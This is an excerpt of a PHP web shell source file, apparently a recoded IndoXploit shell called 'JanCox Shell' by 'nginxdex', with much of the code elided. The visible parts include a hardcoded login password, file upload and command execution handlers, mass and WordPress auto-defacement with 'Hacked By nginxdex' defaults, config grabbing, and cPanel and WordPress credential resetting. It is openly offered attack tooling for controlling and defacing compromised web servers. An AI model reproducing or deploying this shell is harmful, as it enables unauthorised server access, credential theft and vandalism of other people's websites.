<?php
//Priv8 Shell
//default password nya "jancokshell"
...
$lol="6df2dadabbc19ea7d22fb662df4bc7e4"; //password(md5)
function printLogin() { 
    ?> 
<html>
<head>
...
<meta name='author' content='nginxdex'>
<meta charset="UTF-8">
<style type='text/css'>
...
if($_GET['do'] == 'upload') {
 ...
 elseif($_GET['do'] == 'cmd') {
	...
	elseif($_POST['mass'] == 'massdeface') {
		...
		<textarea name='script' style='width: 450px; height: 200px;'>Hacked By nginxdex</textarea><br>
...
elseif($_GET['do'] == 'about') {
    ...
    echo '<center>JanCox Shell<hr>IndoXploit Shell Recoded By nginxdex<br>For More Script Visit <a href="http://cr1p.blogspot.com/">Here</a>';
...
echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='hekel' size='50' value='nginxdex'><br>
		<u>Team</u>: <br>
...
elseif($_GET['do'] == 'config') {
	...
	if($_POST['hajar']) {
		...
		Set User & Pass: <br>
		<input type='text' name='user_baru' value='nginxdex' placeholder='user_baru'><br>
		<input type='text' name='pass_baru' value='nginxdex' placeholder='pass_baru'><br>
...
echo "Shell [ <a href='./shells.txt' target='_blank'>shells.txt</a> ]</span>";
 ...
 elseif($_GET['do'] == 'cpanel') {
	...
	if($_POST['hajar']) {
		...
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Set Title: <br>
		<input type='text' name='new_title' value='Hacked By nginxdex' placeholder='New Title'><br><br>
	...
	if($_POST['submit']) {
		...
		echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='nginxdex'><br>
		<u>Domains</u>: <br>
...
//
	...
	if($_POST['auto_deface_wp']) {
		...
		<input type='text' name='script' height='10' size='50' placeholder='Hacked By nginxdex' required><br>
...
</form>Copyright &copy; ".date("Y")." - <a href='http://forum.indoxploit.or.id/' target='_blank'><font color=lime>IndoXploit</font></a> Shell Recoded By <a href='http://fb.com/nginxdex' target='_BLANK'><font color=lime>nginxdex</a></font></center>";
?>
</html>
